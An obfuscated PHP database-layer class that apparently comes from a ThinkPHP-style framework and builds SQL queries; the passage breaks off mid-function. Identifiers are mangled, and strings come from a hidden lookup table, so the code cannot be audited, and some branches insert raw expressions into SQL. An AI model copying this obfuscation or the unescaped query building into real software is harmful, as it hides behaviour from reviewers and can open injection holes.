<?php
 goto EœÓŞŸÎ¯Ê; cêËà›”ó®: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\156\145\161" => "\x3c\76", "\147\164" => "\76", "\145\147\164" => "\76\x3d", "\x6c\164" => "\x3c", "\145\154\164" => "\74\75", "\156\x6f\x74\x6c\151\x6b\145" => "\116\x4f\x54\40\x4c\x49\x4b\105", "\154\x69\x6b\x65" => "\x4c\111\113\105", "\151\x6e" => "\x49\116", "\156\157\x74\x69\x6e" => "\116\x4f\x54\40\x49\x4e", "\156\157\x74\x20\151\156" => "\116\117\x54\40\x49\x4e", "\x62\145\x74\167\145\145\x6e" => "\102\105\124\x57\105\105\x4e", "\156\157\164\142\145\164\167\x65\145\156" => "\x4e\117\x54\x20\x42\105\x54\x57\105\105\x4e", "\x6e\157\x74\x20\x62\x65\164\167\145\145\156" => "\x4e\117\124\x20\x42\x45\x54\x57\105\x45\x4e"); protected $selectSql = "\x53\x45\x4c\105\103\124\x25\104\x49\123\124\x49\116\103\124\45\x20\45\106\111\x45\x4c\104\45\x20\x46\x52\x4f\115\x20\45\x54\101\x42\114\x45\x25\45\x4a\117\x49\116\x25\45\x57\110\105\x52\x45\x25\x25\107\x52\x4f\125\120\x25\45\x48\101\126\111\x4e\x47\x25\45\x4f\x52\104\105\122\45\45\114\111\115\111\124\x25\40\x25\125\x4e\x49\x4f\116\x25\x25\x43\117\115\x4d\105\116\x54\45"; protected $bind = array(); public static function getInstance() { $ŞªÈˆíö = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[­õöî’–][958], $ŞªÈˆíö); } public function factory($ïşïè¤÷ = '') { $¼Æ”¸Ì =& $_SERVER[­õöî’–]; $ïşïè¤÷ = $this->parseConfig($ïşïè¤÷); if (empty($ïşïè¤÷[$¼Æ”¸Ì[959]])) { think_exception(think_lang($¼Æ”¸Ì[960])); } $this->dbType = ucwords(strtolower($ïşïè¤÷[$¼Æ”¸Ì[959]])); $¼Ãô¥³£ = $¼Æ”¸Ì[961] . $this->dbType; if (class_exists($¼Ãô¥³£)) { $®‰Î·– = new $¼Ãô¥³£($ïşïè¤÷); if ($¼Æ”¸Ì[962] != strtolower($ïşïè¤÷[$¼Æ”¸Ì[959]])) { $®‰Î·–->dbType = strtoupper($this->dbType); } else { $®‰Î·–->dbType = $this->_getDsnType($ïşïè¤÷[$¼Æ”¸Ì[914]]); } } else { think_exception(think_lang($¼Æ”¸Ì[963]) . $¼Æ”¸Ì[964] . $¼Ãô¥³£); } return $®‰Î·–; } public function __call($ÆÒÛã, $±ç™€â–) { if (method_exists($this, $ÆÒÛã)) { return call_user_func_array(array($this, $ÆÒÛã), $±ç™€â–); } } protected function _getDsnType($‘˜ŞòÍÆ) { $ü½Ø¬ = explode($_SERVER[­õöî’–][4], $‘˜ŞòÍÆ); $Û“şÉÜ» = strtoupper(trim($ü½Ø¬[0])); return $Û“şÉÜ»; } private function parseConfig($›©äÕê² = '') { $°®×ò… =& $_SERVER[­õöî’–]; if (!empty($›©äÕê²) && is_string($›©äÕê²)) { $›©äÕê² = $this->parseDSN($›©äÕê²); } elseif (is_array($›©äÕê²)) { $›©äÕê² = array_change_key_case($›©äÕê²); $›©äÕê² = array($°®×ò…[959] => $›©äÕê²[$°®×ò…[965]], $°®×ò…[885] => $›©äÕê²[$°®×ò…[966]], $°®×ò…[886] => $›©äÕê²[$°®×ò…[967]], $°®×ò…[883] => $›©äÕê²[$°®×ò…[968]], $°®×ò…[884] => $›©äÕê²[$°®×ò…[969]], $°®×ò…[21] => $›©äÕê²[$°®×ò…[970]], $°®×ò…[914] => $›©äÕê²[$°®×ò…[971]], $°®×ò…[17] => isset($›©äÕê²[$°®×ò…[972]]) ? $›©äÕê²[$°®×ò…[972]] : array()); } elseif (empty($›©äÕê²)) { if (think_config($°®×ò…[973]) && $°®×ò…[962] != strtolower(think_config($°®×ò…[974]))) { $›©äÕê² = $this->parseDSN(think_config($°®×ò…[973])); } else { $›©äÕê² = array($°®×ò…[959] => think_config($°®×ò…[974]), $°®×ò…[885] => think_config($°®×ò…[975]), $°®×ò…[886] => think_config($°®×ò…[976]), $°®×ò…[883] => think_config($°®×ò…[977]), $°®×ò…[884] => think_config($°®×ò…[978]), $°®×ò…[21] => think_config($°®×ò…[246]), $°®×ò…[914] => think_config($°®×ò…[973]), $°®×ò…[17] => think_config($°®×ò…[979])); } } return $›©äÕê²; } protected function initConnect($à³•²…¸ = true) { if (1 == think_config($_SERVER[­õöî’–][22])) { $this->_linkID = $this->multiConnect($à³•²…¸); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¨©¾›± => $º®¯å³) { $this->_linkID = $º®¯å³; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($õ  °´Ú = false) { $Îô©Ñ‚æ =& $_SERVER[­õöî’–]; static $İ³÷µ£… = array(); static $»ã¯¯ª¹ = -1; if (empty($İ³÷µ£…)) { foreach ($this->config as $±´ñ£ª£ => $òÄ¬Öåğ) { $İ³÷µ£…[$±´ñ£ª£] = explode($Îô©Ñ‚æ[50], $òÄ¬Öåğ); } } if (think_config($Îô©Ñ‚æ[980])) { if ($õ  °´Ú || think_config($Îô©Ñ‚æ[395]) === !0) { $Œ°›¥Üè = floor(mt_rand(0, think_config($Îô©Ñ‚æ[981]) - 1)); $»ã¯¯ª¹ = $Œ°›¥Üè; } else { if (is_numeric(think_config($Îô©Ñ‚æ[982]))) { $Œ°›¥Üè = think_config($Îô©Ñ‚æ[982]); } else { $Œ°›¥Üè = floor(mt_rand(think_config($Îô©Ñ‚æ[981]), count($İ³÷µ£…[$Îô©Ñ‚æ[883]]) - 1)); } } } else { $Œ°›¥Üè = floor(mt_rand(0, count($İ³÷µ£…[$Îô©Ñ‚æ[883]]) - 1)); $»ã¯¯ª¹ = $Œ°›¥Üè; } $Œ°›¥Üè = $»ã¯¯ª¹ !== -1 ? $»ã¯¯ª¹ : $Œ°›¥Üè; $ŒîÂëÒ¢ = array($Îô©Ñ‚æ[885] => isset($İ³÷µ£…[$Îô©Ñ‚æ[885]][$Œ°›¥Üè]) ? $İ³÷µ£…[$Îô©Ñ‚æ[885]][$Œ°›¥Üè] : $İ³÷µ£…[$Îô©Ñ‚æ[885]][0], $Îô©Ñ‚æ[886] => isset($İ³÷µ£…[$Îô©Ñ‚æ[886]][$Œ°›¥Üè]) ? $İ³÷µ£…[$Îô©Ñ‚æ[886]][$Œ°›¥Üè] : $İ³÷µ£…[$Îô©Ñ‚æ[886]][0], $Îô©Ñ‚æ[883] => isset($İ³÷µ£…[$Îô©Ñ‚æ[883]][$Œ°›¥Üè]) ? $İ³÷µ£…[$Îô©Ñ‚æ[883]][$Œ°›¥Üè] : $İ³÷µ£…[$Îô©Ñ‚æ[883]][0], $Îô©Ñ‚æ[884] => isset($İ³÷µ£…[$Îô©Ñ‚æ[884]][$Œ°›¥Üè]) ? $İ³÷µ£…[$Îô©Ñ‚æ[884]][$Œ°›¥Üè] : $İ³÷µ£…[$Îô©Ñ‚æ[884]][0], $Îô©Ñ‚æ[21] => isset($İ³÷µ£…[$Îô©Ñ‚æ[21]][$Œ°›¥Üè]) ? $İ³÷µ£…[$Îô©Ñ‚æ[21]][$Œ°›¥Üè] : $İ³÷µ£…[$Îô©Ñ‚æ[21]][0], $Îô©Ñ‚æ[914] => isset($İ³÷µ£…[$Îô©Ñ‚æ[914]][$Œ°›¥Üè]) ? $İ³÷µ£…[$Îô©Ñ‚æ[914]][$Œ°›¥Üè] : $İ³÷µ£…[$Îô©Ñ‚æ[914]][0], $Îô©Ñ‚æ[17] => isset($İ³÷µ£…[$Îô©Ñ‚æ[17]][$Œ°›¥Üè]) ? $İ³÷µ£…[$Îô©Ñ‚æ[17]][$Œ°›¥Üè] : $İ³÷µ£…[$Îô©Ñ‚æ[17]][0]); return $this->connect($ŒîÂëÒ¢, $Œ°›¥Üè); } public function parseDSN($¤’¢ÆÇÖ) { $š½¾¹È› =& $_SERVER[­õöî’–]; if (empty($¤’¢ÆÇÖ)) { return !1; } $Í½ºĞŒœ = parse_url($¤’¢ÆÇÖ); if ($Í½ºĞŒœ[$š½¾¹È›[180]]) { $ÖúëÛ„Á = array($š½¾¹È›[959] => $Í½ºĞŒœ[$š½¾¹È›[180]], $š½¾¹È›[885] => isset($Í½ºĞŒœ[$š½¾¹È›[600]]) ? $Í½ºĞŒœ[$š½¾¹È›[600]] : $š½¾¹È›[12], $š½¾¹È›[886] => isset($Í½ºĞŒœ[$š½¾¹È›[983]]) ? $Í½ºĞŒœ[$š½¾¹È›[983]] : $š½¾¹È›[12], $š½¾¹È›[883] => isset($Í½ºĞŒœ[$š½¾¹È›[181]]) ? $Í½ºĞŒœ[$š½¾¹È›[181]] : $š½¾¹È›[12], $š½¾¹È›[884] => isset($Í½ºĞŒœ[$š½¾¹È›[182]]) ? $Í½ºĞŒœ[$š½¾¹È›[182]] : $š½¾¹È›[12], $š½¾¹È›[21] => isset($Í½ºĞŒœ[$š½¾¹È›[84]]) ? substr($Í½ºĞŒœ[$š½¾¹È›[84]], 1) : $š½¾¹È›[12]); } else { preg_match($š½¾¹È›[984], trim($¤’¢ÆÇÖ), $¸¤èŞõÁ); $ÖúëÛ„Á = array($š½¾¹È›[959] => $¸¤èŞõÁ[1], $š½¾¹È›[885] => $¸¤èŞõÁ[2], $š½¾¹È›[886] => $¸¤èŞõÁ[3], $š½¾¹È›[883] => $¸¤èŞõÁ[4], $š½¾¹È›[884] => $¸¤èŞõÁ[5], $š½¾¹È›[21] => $¸¤èŞõÁ[6]); } $ÖúëÛ„Á[$š½¾¹È›[914]] = $š½¾¹È›[12]; return $ÖúëÛ„Á; } protected function debug() { $úÈ •ú… =& $_SERVER[­õöî’–]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $úÈ •ú…[985]; if (think_config($úÈ •ú…[986])) { think_status($úÈ •ú…[987]); think_trace($this->queryStr . $úÈ •ú…[988] . think_status($úÈ •ú…[24], $úÈ •ú…[987], 6) . $úÈ •ú…[989], $úÈ •ú…[12], $úÈ •ú…[990]); } } protected function parseLock($ùî¾Õá¥ = false) { $´çı³º° =& $_SERVER[­õöî’–]; if (!$ùî¾Õá¥) { return $´çı³º°[12]; } if ($´çı³º°[916] == $this->dbType) { return $´çı³º°[991]; } return $´çı³º°[992]; } protected function parseSet($÷ª¹×Šî) { $ôç’íÒ” =& $_SERVER[­õöî’–]; foreach ($÷ª¹×Šî as $äõèèœÕ => $´Ó´Ëñş) { if (is_array($´Ó´Ëñş) && $ôç’íÒ”[297] == $´Ó´Ëñş[0]) { $şª»òäà[] = $this->parseKey($äõèèœÕ) . $ôç’íÒ”[881] . $´Ó´Ëñş[1]; } elseif (is_scalar($´Ó´Ëñş) || is_null($´Ó´Ëñş)) { $şª»òäà[] = $this->parseKey($äõèèœÕ) . $ôç’íÒ”[881] . $this->parseValue($´Ó´Ëñş); } } return $ôç’íÒ”[993] . implode($ôç’íÒ”[50], $şª»òäà); } protected function bindParam($ã©’é†, $¹Ì°¹Éî) { $this->bind[$_SERVER[­õöî’–][4] . $ã©’é†] = $¹Ì°¹Éî; } protected function parseBind($©Éí¢ï ) { $©Éí¢ï  = array_merge($this->bind, $©Éí¢ï ); $this->bind = array(); return $©Éí¢ï ; } function parseKey(&$äŸ’œ±â, $³ÉÃƒ¦Š = true) { if ($³ÉÃƒ¦Š) { $äŸ’œ±â = $this->parseKeyCheck($äŸ’œ±â); } return $äŸ’œ±â; } function parseKeyCheck($«²—êìÚ) { $–¤ñ¼¬ö =& $_SERVER[­õöî’–]; $«²—êìÚ = trim($«²—êìÚ); if (!preg_match($–¤ñ¼¬ö[994], $«²—êìÚ)) { think_exception($–¤ñ¼¬ö[995] . $«²—êìÚ); } return $«²—êìÚ; } protected function parseValue($ŞŞØÉÖ‡) { $ı¦õ‘ˆ¸ =& $_SERVER[­õöî’–]; if (is_string($ŞŞØÉÖ‡)) { $ŞŞØÉÖ‡ = $ı¦õ‘ˆ¸[955] . $this->escapeString($ŞŞØÉÖ‡) . $ı¦õ‘ˆ¸[955]; } elseif (isset($ŞŞØÉÖ‡[0]) && is_string($ŞŞØÉÖ‡[0]) && strtolower($ŞŞØÉÖ‡[0]) == $ı¦õ‘ˆ¸[297]) { $ŞŞØÉÖ‡ = $this->escapeString($ŞŞØÉÖ‡[1]); } elseif (is_array($ŞŞØÉÖ‡)) { $ŞŞØÉÖ‡ = array_map(array($this, $ı¦õ‘ˆ¸[956]), $ŞŞØÉÖ‡); } elseif (is_bool($ŞŞØÉÖ‡)) { $ŞŞØÉÖ‡ = $ŞŞØÉÖ‡ ? $ı¦õ‘ˆ¸[88] : $ı¦õ‘ˆ¸[197]; } elseif (is_null($ŞŞØÉÖ‡)) { $ŞŞØÉÖ‡ = $ı¦õ‘ˆ¸[103]; } return $ŞŞØÉÖ‡; } protected function parseField($”æÁÉÏ) { $ÛÜƒù–ı =& $_SERVER[­õöî’–]; if (is_string($”æÁÉÏ) && strpos($”æÁÉÏ, $ÛÜƒù–ı[50])) { $”æÁÉÏ = explode($ÛÜƒù–ı[50], $”æÁÉÏ); } if (is_array($”æÁÉÏ)) { $øÀ§ƒÕ = array(); foreach ($”æÁÉÏ as $ËÀÜíæ => $”Çï“ö) { if (!is_numeric($ËÀÜíæ)) { $øÀ§ƒÕ[] = $this->parseKey($ËÀÜíæ, !1) . $ÛÜƒù–ı[996] . $this->parseKey($”Çï“ö); } else { $øÀ§ƒÕ[] = $this->parseKey($”Çï“ö); } } $«šÎÁ¢á = implode($ÛÜƒù–ı[50], $øÀ§ƒÕ); } elseif (is_string($”æÁÉÏ) && !empty($”æÁÉÏ)) { $«šÎÁ¢á = $”æÁÉÏ; } else { $«šÎÁ¢á = $ÛÜƒù–ı[188]; } return $«šÎÁ¢á; } protected function parseTable($ì˜±õâ) { $ò«â÷‘ =& $_SERVER[­õöî’–]; if (is_array($ì˜±õâ)) { $ƒœÃ¨Ğá = array(); foreach ($ì˜±õâ as $¯í­Ü ó => $£Åè™ë) { if (!is_numeric($¯í­Ü ó)) { $ƒœÃ¨Ğá[] = $this->parseKey($¯í­Ü ó) . $ò«â÷‘[53] . $this->parseKey($£Åè™ë); } else { $ƒœÃ¨Ğá[] = $this->parseKey($¯í­Ü ó); } } $ì˜±õâ = $ƒœÃ¨Ğá; } elseif (is_string($ì˜±õâ)) { if (strstr($ì˜±õâ, $ò«â÷‘[53])) { return $ì˜±õâ; } $ì˜±õâ = explode($ò«â÷‘[50], $ì˜±õâ); array_walk($ì˜±õâ, array($this, $ò«â÷‘[903])); } return $ò«â÷‘[897] . trim(implode($ò«â÷‘[997], $ì˜±õâ), $ò«â÷‘[385]) . $ò«â÷‘[897]; } protected function parseWhere($Õô…šÒÓ) { $ö¼Ê°²ó =& $_SERVER[­õöî’–]; $“Ëî½ç = $ö¼Ê°²ó[12]; if (is_string($Õô…šÒÓ)) { $“Ëî½ç = $Õô…šÒÓ; } else { $ªÇĞºâĞ = isset($Õô…šÒÓ[$ö¼Ê°²ó[998]]) ? strtoupper($Õô…šÒÓ[$ö¼Ê°²ó[998]]) : $ö¼Ê°²ó[12]; if (in_array($ªÇĞºâĞ, array($ö¼Ê°²ó[999], $ö¼Ê°²ó[1000], $ö¼Ê°²ó[1001]))) { $ªÇĞºâĞ = $ö¼Ê°²ó[53] . $ªÇĞºâĞ . $ö¼Ê°²ó[53]; unset($Õô…šÒÓ[$ö¼Ê°²ó[998]]); } else { $ªÇĞºâĞ = $ö¼Ê°²ó[1002]; } foreach ($Õô…šÒÓ as $–ˆ¹“€Œ => $“Ú”’÷˜) { $“Ëî½ç .= $ö¼Ê°²ó[277]; if (is_numeric($–ˆ¹“€Œ)) { $–ˆ¹“€Œ = $ö¼Ê°²ó[1003]; } if (0 === strpos($–ˆ¹“€Œ, $ö¼Ê°²ó[11])) { $“Ëî½ç .= $this->parseThinkWhere($–ˆ¹“€Œ, $“Ú”’÷˜); } else { if (!preg_match($ö¼Ê°²ó[1004], trim($–ˆ¹“€Œ))) { think_exception(think_lang($ö¼Ê°²ó[1005]) . $ö¼Ê°²ó[4] . $–ˆ¹“€Œ); } $ÒÄÔ¦Œ™ = is_array($“Ú”’÷˜) && isset($“Ú”’÷˜[$ö¼Ê°²ó[1006]]); $–ˆ¹“€Œ = trim($–ˆ¹“€Œ); if (strpos($–ˆ¹“€Œ, $ö¼Ê°²ó[283])) { $ö“®µèç = explode($ö¼Ê°²ó[283], $–ˆ¹“€Œ); $Ôİˆ¾ü = array(); foreach ($ö“®µèç as $Äõ¿‘¾Ö => $Âõ¡˜°Ô) { $¹•‘Êñà = $ÒÄÔ¦Œ™ ? $“Ú”’÷˜[$Äõ¿‘¾Ö] : $“Ú”’÷˜; $Ôİˆ¾ü[] = $ö¼Ê°²ó[260] . $this->parseWhereItem($this->parseKey($Âõ¡˜°Ô), $¹•‘Êñà) . $ö¼Ê°²ó[902]; } $“Ëî½ç .= implode($ö¼Ê°²ó[1007], $Ôİˆ¾ü); } elseif (strpos($–ˆ¹“€Œ, $ö¼Ê°²ó[284])) { $ö“®µèç = explode($ö¼Ê°²ó[284], $–ˆ¹“€Œ); $Ôİˆ¾ü = array(); foreach ($ö“®µèç as $Äõ¿‘¾Ö => $Âõ¡˜°Ô) { $¹•‘Êñà = $ÒÄÔ¦Œ™ ? $“Ú”’÷˜[$Äõ¿‘¾Ö] : $“Ú”’÷˜; $Ôİˆ¾ü[] = $ö¼Ê°²ó[260] . $this->parseWhereItem($this->parseKey($Âõ¡˜°Ô), $¹•‘Êñà) . $ö¼Ê°²ó[902]; } $“Ëî½ç .= implode($ö¼Ê°²ó[1002], $Ôİˆ¾ü); } else { $“Ëî½ç .= $this->parseWhereItem($this->parseKey($–ˆ¹“€Œ), $“Ú”’÷˜); } } $“Ëî½ç .= $ö¼Ê°²ó[278] . $ªÇĞºâĞ; } $“Ëî½ç = substr($“Ëî½ç, 0, -strlen($ªÇĞºâĞ)); } return empty($“Ëî½ç) ? $ö¼Ê°²ó[12] : $ö¼Ê°²ó[1008] . $“Ëî½ç; } protected function parseWhereItem($˜´Å„ÁÉ, $“üÁİ†) { $Â¦ïÏŠ© =& $_SERVER[­õöî’–]; $ô’¢ëÖÖ = $Â¦ïÏŠ©[12]; if (is_array($“üÁİ†)) { if (is_string($“üÁİ†[0])) { $û‹«ÊÖ˜ = strtolower($“üÁİ†[0]); if (in_array($“üÁİ†[0], array($Â¦ïÏŠ©[881], $Â¦ïÏŠ©[1009], $Â¦ïÏŠ©[1010], $Â¦ïÏŠ©[1011], $Â¦ïÏŠ©[1012], $Â¦ïÏŠ©[1013]))) { $ô’¢ëÖÖ .= $˜´Å„ÁÉ . $Â¦ïÏŠ©[53] . $“üÁİ†[0] . $Â¦ïÏŠ©[53] . $this->parseValue($“üÁİ†[1]); } elseif (preg_match($Â¦ïÏŠ©[1014], $“üÁİ†[0])) { $ô’¢ëÖÖ .= $˜´Å„ÁÉ . $Â¦ïÏŠ©[53] . $this->exp[$û‹«ÊÖ˜] . $Â¦ïÏŠ©[53] . $this->parseValue($“üÁİ†[1]); } elseif (preg_match($Â¦ïÏŠ©[1015], $“üÁİ†[0])) { if (is_array($“üÁİ†[1])) { $ÊŒÙ•İ‹ = isset($“üÁİ†[2]) ? strtoupper($“üÁİ†[2]) : $Â¦ïÏŠ©[1000]; if (in_array($ÊŒÙ•İ‹, array($Â¦ïÏŠ©[999], $Â¦ïÏŠ©[1000], $Â¦ïÏŠ©[1001]))) { $º‹³«•° = array(); foreach ($“üÁİ†[1] as $¯‘ãë—) { $º‹³«•°[] = $˜´Å„ÁÉ . $Â¦ïÏŠ©[53] . $this->exp[$û‹«ÊÖ˜] . $Â¦ïÏŠ©[53] . $this->parseValue($¯‘ãë—); } $ô’¢ëÖÖ .= $Â¦ïÏŠ©[260] . implode($Â¦ïÏŠ©[53] . $ÊŒÙ•İ‹ . $Â¦ïÏŠ©[53], $º‹³«•°) . $Â¦ïÏŠ©[902]; } } else { $ô’¢ëÖÖ .= $˜´Å„ÁÉ . $Â¦ïÏŠ©[53] . $this->exp[$û‹«ÊÖ˜] . $Â¦ïÏŠ©[53] . $this->parseValue($“üÁİ†[1]); } } elseif ($Â¦ïÏŠ©[297] == $û‹«ÊÖ˜) { $ô’¢ëÖÖ .= $Â¦ïÏŠ©[900] . $˜´Å„ÁÉ . $Â¦ïÏŠ©[53] . $“üÁİ†[1] . $Â¦ïÏŠ©[1016]; } elseif (preg_match($Â¦ïÏŠ©[1017], $“üÁİ†[0])) { $ô’¢ëÖÖ .= $“üÁİ†[0]; } elseif (preg_match($Â¦ïÏŠ©[1018], $“üÁİ†[0])) { if (isset($“üÁİ†[2]) && $Â¦ïÏŠ©[297] == $“üÁİ†[2]) { $ô’¢ëÖÖ .= $˜´Å„ÁÉ . $Â¦ïÏŠ©[53] . $this->exp[$û‹«ÊÖ˜] . $Â¦ïÏŠ©[53] . $“üÁİ†[1]; } else { if (is_string($“üÁİ†[1])) { $“üÁİ†[1] = explode($Â¦ïÏŠ©[50], $“üÁİ†[1]); } $¦ô‰ïÜ¶ = implode($Â¦ïÏŠ©[50], $this->parseValue($“üÁİ†[1])); $ô’¢ëÖÖ .= $˜´Å„ÁÉ . $Â¦ïÏŠ©[53] . $this->exp[$û‹«ÊÖ˜] . $Â¦ïÏŠ©[900] . $¦ô‰ïÜ¶ . $Â¦ïÏŠ©[902]; } } elseif (preg_match($Â¦ïÏŠ©[1019], $“üÁİ†[0])) { $Õ¼òÓ = is_string($“üÁİ†[1]) ? explode($Â¦ïÏŠ©[50], $“üÁİ†[1]) : $“üÁİ†[1]; $ô’¢ëÖÖ .= $Â¦ïÏŠ©[900] . $˜´Å„ÁÉ . $Â¦ïÏŠ©[53] . $this->exp[$û‹«ÊÖ˜] . $Â¦ïÏŠ©[53] . $this->parseValue($Õ¼òÓ[0]) . $Â¦ïÏŠ©[1002] . $this->parseValue($Õ¼òÓ[1]) . $Â¦ïÏŠ©[278]; } else { think_exception(think_lang($Â¦ïÏŠ©[1005]) . $Â¦ïÏŠ©[4] . $“üÁİ†[0]); } } else { $”ğ»–Õø = count($“üÁİ†); $²öéç­Ë = $Â¦ïÏŠ©[12]; if (is_string($“üÁİ†[$”ğ»–Õø - 1])) { $²öéç­Ë = isset($“üÁİ†[$”ğ»–Õø - 1]) ? strtoupper($“üÁİ†[$”ğ»–Õø - 1]) : $Â¦ïÏŠ©[12]; if (in_array($²öéç­Ë, array($Â¦ïÏŠ©[999], $Â¦ïÏŠ©[1000], $Â¦ïÏŠ©[1001]))) { $”ğ»–Õø = $”ğ»–Õø - 1; } } else { $²öéç­Ë = $Â¦ïÏŠ©[999]; } for ($Ğ×“¯—ì = 0; $Ğ×“¯—ì < $”ğ»–Õø; $Ğ×“¯—ì++) { $Õ¼òÓ = is_array($“üÁİ†[$Ğ×“¯—ì]) ? $“üÁİ†[$Ğ×“¯—ì][1] : $“üÁİ†[$Ğ×“¯—ì]; if ($Â¦ïÏŠ©[297] == strtolower($“üÁİ†[$Ğ×“¯—ì][0])) { $ô’¢ëÖÖ .= $Â¦ïÏŠ©[260] . $˜´Å„ÁÉ . $Â¦ïÏŠ©[53] . $Õ¼òÓ . $Â¦ïÏŠ©[1016] . $²öéç­Ë . $Â¦ïÏŠ©[53]; } else { $Š¿‚ÈÃÙ = is_array($“üÁİ†[$Ğ×“¯—ì]) ? $this->exp[strtolower($“üÁİ†[$Ğ×“¯—ì][0])] : $Â¦ïÏŠ©[881]; if (!$Š¿‚ÈÃÙ && is_array($“üÁİ†[$Ğ×“¯—ì]) && in_array($“üÁİ†[$Ğ×“¯—ì][0], array($Â¦ïÏŠ©[881], $Â¦ïÏŠ©[1009], $Â¦ïÏŠ©[1010], $Â¦ïÏŠ©[1011], $Â¦ïÏŠ©[1012], $Â¦ïÏŠ©[1013]))) { $Š¿‚ÈÃÙ = $“üÁİ†[$Ğ×“¯—ì][0]; } $ô’¢ëÖÖ .= $Â¦ïÏŠ©[260] . $˜´Å„ÁÉ . $Â¦ïÏŠ©[53] . $Š¿‚ÈÃÙ . $Â¦ïÏŠ©[53] . $this->parseValue($Õ¼òÓ) . $Â¦ïÏŠ©[1016] . $²öéç­Ë . $Â¦ïÏŠ©[53]; } } $ô’¢ëÖÖ = substr($ô’¢ëÖÖ, 0, -4); } } else { $ô’¢ëÖÖ .= $˜´Å„ÁÉ . $Â¦ïÏŠ©[1020] . $this->parseValue($“üÁİ†); } return $ô’¢ëÖÖ; } protected function parseThinkWhere($ñ­‚¾È, $ğìÉÇŠ¬) { $ï±³öòû =& $_SERVER[­õöî’–]; $Ó‹ôşÁè = $ï±³öòû[12]; switch ($ñ­‚¾È) { case $ï±³öòû[352]: $Ó‹ôşÁè = $ğìÉÇŠ¬; break; case $ï±³öòû[1003]: $Ó‹ôşÁè = is_string($ğìÉÇŠ¬) ? $ğìÉÇŠ¬ : substr($this->parseWhere($ğìÉÇŠ¬), 6); break; case $ï±³öòû[1021]: parse_str($ğìÉÇŠ¬, $¯Ú³Öš…); if (isset($¯Ú³Öš…[$ï±³öòû[998]])) { $õé£àŸ¼ = $ï±³öòû[53] . strtoupper($¯Ú³Öš…[$ï±³öòû[998]]) . $ï±³öòû[53]; unset($¯Ú³Öš…[$ï±³öòû[998]]); } else { $õé£àŸ¼ = $ï±³öòû[1002]; } $«ô““³ = array(); foreach ($¯Ú³Öš… as $¢¬ñõêñ => $¸ê°İ“á) { $«ô““³[] = $this->parseKey($¢¬ñõêñ) . $ï±³öòû[1020] . $this->parseValue($¸ê°İ“á); } $Ó‹ôşÁè = implode($õé£àŸ¼, $«ô““³); break; } return $Ó‹ôşÁè; } protected function parseLimit($œ¥Ù›¯) { $ÌŒŞŠ» =& $_SERVER[­õöî’–]; return !empty($œ¥Ù›¯) ? $ÌŒŞŠ»[51] . $œ¥Ù›¯ . $ÌŒŞŠ»[53] : $ÌŒŞŠ»[12]; } protected function parseJoin($Ğ„êÊÌ) { $Å€ëá™´ =& $_SERVER[­õöî’–]; $–ËôÃòÖ = $Å€ëá™´[12]; if (!empty($Ğ„êÊÌ)) { if (is_array($Ğ„êÊÌ)) { foreach ($Ğ„êÊÌ as $¾äº†˜¿ => $Î²ô¹Ìñ) { if (!1 !== stripos($Î²ô¹Ìñ, $Å€ëá™´[1022])) { $–ËôÃòÖ .= $Å€ëá™´[53] . $Î²ô¹Ìñ; } else { $–ËôÃòÖ .= $Å€ëá™´[1023] . $Î²ô¹Ìñ; } } } else { $–ËôÃòÖ .= $Å€ëá™´[1023] . $Ğ„êÊÌ; } } $–ËôÃòÖ = preg_replace($Å€ëá™´[1024], think_config($Å€ëá™´[928]) . $Å€ëá™´[1025], $–ËôÃòÖ); return $–ËôÃòÖ; } protected function parseOrder($ò—¬ë’”) { $ÒÆŠÂÃÏ =& $_SERVER[­õöî’–]; if (is_array($ò—¬ë’”)) { $öŸ“ÌÚ = array(); foreach ($ò—¬ë’” as $µì¥å® => $Äö”ıøŸ) { if (is_numeric($µì¥å®)) { $öŸ“ÌÚ[] = $this->parseKey($Äö”ıøŸ); } else { $Äö”ıøŸ = in_array(strtoupper(trim($Äö”ıøŸ)), array($ÒÆŠÂÃÏ[1026], $ÒÆŠÂÃÏ[1027])) ? $ÒÆŠÂÃÏ[53] . $Äö”ıøŸ : $ÒÆŠÂÃÏ[12]; if (preg_match($ÒÆŠÂÃÏ[1028], $µì¥å®)) { $öŸ“ÌÚ[] = $this->parseKey($µì¥å®) . $Äö”ıøŸ; } else { think_exception($ÒÆŠÂÃÏ[1029] . $µì¥å®); } } } $ò—¬ë’” = implode($ÒÆŠÂÃÏ[50], $öŸ“ÌÚ); } return !empty($ò—¬ë’”) ? $ÒÆŠÂÃÏ[1030] . $ò—¬ë’” : $ÒÆŠÂÃÏ[12]; } protected function parseGroup($ºÇ‡§¸Ù) { $–ÛêƒªÅ =& $_SERVER[­õöî’–]; return !empty($ºÇ‡§¸Ù) ? $–ÛêƒªÅ[1031] . $ºÇ‡§¸Ù : $–ÛêƒªÅ[12]; } protected function parseHaving($ß˜¬”ş) { $Ùõ¼÷Ş =& $_SERVER[­õöî’–]; return !empty($ß˜¬”ş) ? $Ùõ¼÷Ş[1032] . $ß˜¬”ş : $Ùõ¼÷Ş[12]; } protected function parseComment($½Äù¨±á) { $·ğ¦Ñ =& $_SERVER[­õöî’–]; return !empty($½Äù¨±á) ? $·ğ¦Ñ[1033] . $½Äù¨±á . $·ğ¦Ñ[1034] : $·ğ¦Ñ[12]; } protected function parseDistinct($Çåşî¾Ç) { $ıÉôëıÍ =& $_SERVER[­õöî’–]; return !empty($Çåşî¾Ç) ? $ıÉôëıÍ[1035] : $ıÉôëıÍ[12]; } protected function parseUnion($Ó‰šìüÃ) { $ºİÜÌ› =& $_SERVER[­õöî’–]; if (empty($Ó‰šìüÃ)) { return $ºİÜÌ›[12]; } if (isset($Ó‰šìüÃ[$ºİÜÌ›[348]])) { $ ¶×‚ˆÒ = $ºİÜÌ›[1036]; unset($Ó‰šìüÃ[$ºİÜÌ›[348]]); } else { $ ¶×‚ˆÒ = $ºİÜÌ›[1037]; } foreach ($Ó‰šìüÃ as 